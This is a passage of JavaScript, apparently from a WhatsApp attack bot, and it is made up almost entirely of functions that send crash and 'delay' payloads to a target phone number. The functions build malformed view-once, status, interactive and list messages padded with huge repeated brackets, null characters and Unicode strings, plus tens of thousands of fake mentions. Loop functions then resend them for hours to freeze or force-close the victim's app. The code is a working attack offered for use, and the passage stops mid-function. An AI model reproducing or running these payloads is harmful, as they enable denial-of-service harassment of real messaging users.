linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "⩟⬦𪲁 𝐑͜͢𝐈𝐙͠𝐗𝐕͠𝐄𝐋𝐙̸̷̷̷͡𝐗͜͢𝐒 - 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: InJectXploit,
},
{
name: "call_permission_request",
buttonParamsJson: InJectXploit + "{",
},
],
},
},
},
},
}, {}
);

await zaree.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: {
jid: target
},
});
}

// FUNC DELAY SUPPER
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "M O R T A L- H E R E",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".𝗠𝗼𝗿𝘁𝗮𝗹𝗫 ▾" + "༑ ▾俳貍賳貎".repeat(100),
                                    title: "Finix",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await zaree.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await zaree.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "M O R T A L J R"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await zaree.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await zaree.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

async function protocolbug5(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".𝗠𝗼𝗿𝘁𝗮𝗹 𝗦𝗮𝘆𝗮𝗻𝗴 𝗞𝗮𝗺𝘂" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "Mortal Keren🚫",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗠𝗼𝗿𝘁𝗮𝗹𝗫"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await zaree.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await zaree.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protocolbug6(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "MortalKILLER!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "MortalKILLER!!", 
            paramsJson: "ꦿꦸ".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "MORTALGANTENG",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await zaree.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await zaree.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "ꎭꂦꋪ꓄ꍏ꒒ ꉧꍏᖘꀤ" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function trashprotocol(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 2000000)}@s.whatsapp.net`
        )
    ];

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        annotations: [],
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await zaree.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await zaree.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function DelaySsuper(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Wafzz Here",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await zaree.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await zaree.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "From U 2000 Years Ago" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function delayinvisiXo(target) {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "MORTAL IS HERE",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "☠️" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "( # )"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await zaree.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function RyuciDelay(target, mention = true) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "🩸 МФЯГДL Ж ЈЦИІФЯ 🩸" + "ោ៝".repeat(10000),
    title: "🩸 МФЯГДL Ж ЈЦИІФЯ 🩸",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.youtube.com/@Kamilxiter",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "🩸 МФЯГДL Ж ЈЦИІФЯ 🩸",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸 МФЯГДL Ж ЈЦИІФЯ 🩸",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await zaree.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await zaree.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function VampBroadcast(target, mention) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0000".repeat(92000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Mortal Is Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "𓆩𓆪" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await zaree.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await zaree.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Mortal Is Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function DelayHard(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); 
let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending messages`);
        return;
       }

        try {
    if (count < 500) {
        await Promise.all([
         ViewOncdelay(zaree, target),
        ]);
        console.log(chalk.red(`𝘄𝗵𝗼𝗼𝗽𝘀𝘅 𝐝𝐞𝐥𝐚𝐲 𝐡𝐚𝐫𝐝 (𝐀𝐩𝐢) ${count}/500 ke ${target}`));
        count++;
        setTimeout(sendNext, 300);
    } else {
        console.log(chalk.green(`✅ Success Sending 500 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 500 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 10000);
}
};

sendNext();

}

async function buldoz(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); 
let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending messages`);
        return;
       }

        try {
    if (count < 700) {
        await Promise.all([
         bulldozer(isTarget)
        ]);
        console.log(chalk.red(`𝘄𝗵𝗼𝗼𝗽𝘀𝘅 buldozer (𝐀𝐩𝐢) ${count}/700 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
    } else {
        console.log(chalk.green(`✅ Success Sending 700 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 400 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 10000);
}
};

sendNext();

}

//FC FUNC
async function CardsSqL(target) {
  const cards = [];

  for (let r = 0; r < 1000; r++) {
    cards.push({
      header: {
    videoMessage: { 
      url: "https://files.catbox.moe/ncblg3.mp4" 
    },
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "XXX" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "\u0000".repeat(60000),
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: " ",
              body: " ",
              thumbnailUrl: " ",
              mediaType: 1,
              sourceUrl: "https://xnxx.com",
              showAdAttribution: false 
            }
          }
        }
      }
    }
  }, 
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) 
      }
    });
  }

  const MSG = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "\u0000".repeat(60000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "XXX" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], 
              externalAdReply: {
                title: " ",
                body: " ",
                thumbnailUrl: "https://xnxx.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://xnxx.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await zaree.relayMessage(target, MSG.message, {
    participant: { jid: target },
    messageId: MSG.key.id
  });
console.log(chalk.red("Whoopsx Success Sending Fc Bugs"));
}

async function langitfc(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Mortal!",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.9999999,
                name: "Mortal",
                address: "Mortal",
              },
            },
            body: {
              text: "Mortal Is Back!",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{".repeat(10000),
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: target
           },
          },
        },
      },
    };

    await zaree.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
console.log(chalk.blue("Whoopsx Success Sending Fc Bugs"));
}

async function ViewOncdelay(zaree, target) {
  let flag = true
  const session = "5e03e0&mms3"
  const encMedia = "10000000_2012297619515179_5714769099548640934_n.enc"
  const mime = "image/webp"

  if (flag && 123 > 42) {
    flag = false
  }

  const content = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          mimetype: mime,
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${encMedia}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${session}=true`,
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
